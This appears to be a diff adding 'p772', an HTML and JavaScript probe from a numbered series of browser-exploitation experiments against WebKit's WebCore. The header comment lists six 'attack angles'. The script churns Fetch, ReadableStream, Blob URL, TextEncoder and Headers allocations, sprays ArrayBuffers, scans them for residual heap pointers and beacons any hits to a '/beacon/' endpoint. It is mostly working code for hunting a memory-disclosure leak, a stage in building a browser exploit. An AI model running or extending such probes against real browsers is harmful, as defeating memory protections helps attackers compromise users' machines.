@@ -1,0 +1,335 @@
+<!--
+  p772: Fetch API Response / ReadableStream internal buffer residue
+
+  The Fetch API creates Response objects with ReadableStream bodies
+  backed by C++ FetchBodyConsumer and ReadableStreamSource objects.
+  These internal objects live in WebCore's networking subsystem and
+  allocate from different pools than the JS heap.
+
+  Key insight: when a Response body is consumed (via .text(),
+  .arrayBuffer(), .json(), .blob()), the internal stream buffers
+  are assembled and then freed. The assembly involves creating
+  intermediate SharedBuffer segments in C++. If we consume and drop
+  many Response bodies, then spray ArrayBuffers, we might observe
+  residual pointers from the networking/stream internals.
+
+  Additionally: Response.clone() creates a tee of the ReadableStream,
+  which allocates a ReadableStreamTee object with pointers to both
+  branches. Cloning and consuming one branch while dropping the other
+  creates a specific deallocation pattern.
+
+  ReadableStream with a custom underlying source (via new
+  ReadableStream({start, pull, cancel})) gives JS control over
+  when chunks are enqueued. The controller object has C++ backing
+  that holds the queue of chunks. Enqueueing typed arrays and then
+  reading them exercises the chunk transfer path.
+
+  Blob URL creation (URL.createObjectURL) and revocation also
+  exercises the blob registry, which holds internal C++ state.
+
+  Attack angles:
+  A) Fetch self-request, consume body, drop Response, spray ABs.
+  B) Response.clone() tee deallocation pattern residue.
+  C) ReadableStream custom source with controlled chunk sizes.
+  D) Blob URL create/revoke allocation churn.
+  E) TextEncoder/TextDecoder stream buffer interleave.
+  F) Request/Response header map internal allocation residue.
+
+  CRASH_CLASS: LOW (fetch/stream/blob operations, no side effects)
+  prior art: p630 (fetch confirmed available), p763 (AB transfer)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p772</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+
+window.onload=async function(){
+b('p772-START');
+
+// === Section A: Fetch self-request body consume then spray ===
+try{
+  b('A-fetch-body');
+  var aHits=0;
+
+  for(var round=0;round<5;round++){
+    var responses=[];
+    for(var i=0;i<20;i++){
+      try{
+        var r=await fetch('/beacon/fetch_test_'+round+'_'+i);
+        responses.push(r);
+      }catch(e){
+        if(i===0 && round===0)b('A fetch_err='+e.message);
+      }
+    }
+
+    var bodies=[];
+    for(var i=0;i<responses.length;i++){
+      try{
+        var ab=await responses[i].arrayBuffer();
+        bodies.push(ab);
+      }catch(e){}
+    }
+    b('A round='+round+' fetched='+responses.length+' bodies='+bodies.length);
+    responses=null;
+    bodies=null;
+
+    for(var i=0;i<2000;i++){var tmp=new ArrayBuffer(128);}
+
+    var szHits=0;
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(192);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=192;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=3)b('A-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    aHits+=szHits;
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: Response.clone() tee residue ===
+try{
+  b('B-clone-tee');
+  var bHits=0;
+
+  for(var round=0;round<5;round++){
+    var clones=[];
+    for(var i=0;i<20;i++){
+      try{
+        var r=await fetch('/beacon/clone_test_'+round+'_'+i);
+        var c1=r.clone();
+        var c2=r.clone();
+        await r.text();
+        await c1.text();
+        clones.push(c2);
+      }catch(e){
+        if(i===0 && round===0)b('B clone_err='+e.message);
+      }
+    }
+
+    for(var i=0;i<clones.length;i++){
+      try{await clones[i].text();}catch(e){}
+    }
+    clones=null;
+
+    for(var i=0;i<2000;i++){var tmp=new ArrayBuffer(96);}
+
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(128);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=128;off+=8){
+        if(isPtr(dv,off)){
+          bHits++;
+          if(bHits<=3)b('B-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: ReadableStream custom source with controlled chunks ===
+try{
+  b('C-custom-stream');
+  var cHits=0;
+
+  for(var trial=0;trial<10;trial++){
+    var chunkCount=0;
+    var stream=new ReadableStream({
+      start:function(controller){
+        for(var i=0;i<50;i++){
+          var chunk=new Uint8Array(192);
+          for(var j=0;j<192;j++)chunk[j]=(i*7+j)&0xFF;
+          controller.enqueue(chunk);
+          chunkCount++;
+        }
+        controller.close();
+      }
+    });
+
+    var reader=stream.getReader();
+    var chunks=[];
+    while(true){
+      var result=await reader.read();
+      if(result.done)break;
+      chunks.push(result.value);
+    }
+
+    if(trial===0)b('C chunks_read='+chunks.length);
+    chunks=null;
+    reader=null;
+    stream=null;
+  }
+
+  for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+  var SIZES=[64,96,128,192];
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    var szHits=0;
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=2)b('C-PTR sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    cHits+=szHits;
+    b('C sz='+sz+' hits='+szHits);
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: Blob URL create/revoke churn ===
+try{
+  b('D-blob-url');
+  var dHits=0;
+
+  var urls=[];
+  for(var i=0;i<100;i++){
+    var data=new Uint8Array(256);
+    for(var j=0;j<256;j++)data[j]=(i*13+j)&0xFF;
+    var blob=new Blob([data],{type:'application/octet-stream'});
+    var url=URL.createObjectURL(blob);
+    urls.push(url);
+  }
+  b('D created '+urls.length+' blob URLs');
+
+  for(var i=0;i<urls.length;i++){
+    URL.revokeObjectURL(urls[i]);
+  }
+  urls=null;
+
+  for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(128);
+    var dv=new DataView(ab);
+    for(var off=0;off+8<=128;off+=8){
+      if(isPtr(dv,off)){
+        dHits++;
+        if(dHits<=3)b('D-PTR i='+i+' off='+off+' val='+hex64(dv,off));
+      }
+    }
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: TextEncoder/TextDecoder buffer interleave ===
+try{
+  b('E-textcodec');
+  var eHits=0;
+
+  var encoder=new TextEncoder();
+  var decoder=new TextDecoder();
+
+  var strings=[];
+  for(var i=0;i<100;i++){
+    strings.push('Test string number '+i+' with some padding '+'x'.repeat(50+i));
+  }
+
+  var encoded=[];
+  for(var i=0;i<strings.length;i++){
+    encoded.push(encoder.encode(strings[i]));
+  }
+
+  var target=new Uint8Array(512);
+  var encodeIntoResults=[];
+  for(var i=0;i<strings.length;i++){
+    var result=encoder.encodeInto(strings[i],target);
+    encodeIntoResults.push({read:result.read,written:result.written});
+  }
+  b('E encodeInto[0] read='+encodeIntoResults[0].read+' written='+encodeIntoResults[0].written);
+
+  var streamDecoder=new TextDecoder('utf-8',{fatal:false});
+  var chunks=[];
+  for(var i=0;i<encoded.length;i++){
+    var partial=streamDecoder.decode(encoded[i],{stream:i<encoded.length-1});
+    chunks.push(partial);
+  }
+  b('E stream_decode_chunks='+chunks.length);
+
+  encoded=null;
+  chunks=null;
+  strings=null;
+
+  for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(96);}
+
+  for(var i=0;i<200;i++){
+    var ab=new ArrayBuffer(128);
+    var dv=new DataView(ab);
+    for(var off=0;off+8<=128;off+=8){
+      if(isPtr(dv,off)){
+        eHits++;
+        if(eHits<=3)b('E-PTR i='+i+' off='+off+' val='+hex64(dv,off));
+      }
+    }
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: Request/Response header map residue ===
+try{
+  b('F-headers');
+  var fHits=0;
+
+  var requests=[];
+  for(var i=0;i<50;i++){
+    var h=new Headers();
+    for(var j=0;j<20;j++){
+      h.set('X-Custom-'+j+'-'+i, 'value-'+j+'-'+'y'.repeat(30));
+    }
+    var req=new Request('/beacon/headers_'+i,{
+      method:'GET',
+      headers:h
+    });
+    requests.push(req);
+  }
+  b('F created '+requests.length+' requests with 20 headers each');
+
+  var headerCounts=[];
+  for(var i=0;i<requests.length;i++){
+    var count=0;
+    requests[i].headers.forEach(function(){count++;});
+    headerCounts.push(count);
+  }
+  b('F header_counts[0]='+headerCounts[0]);
+
+  requests=null;
+
+  for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(96);}
+
+  for(var i=0;i<200;i++){
+    var ab=new ArrayBuffer(192);
+    var dv=new DataView(ab);
+    for(var off=0;off+8<=192;off+=8){
+      if(isPtr(dv,off)){
+        fHits++;
+        if(fHits<=3)b('F-PTR i='+i+' off='+off+' val='+hex64(dv,off));
+      }
+    }
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p772-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
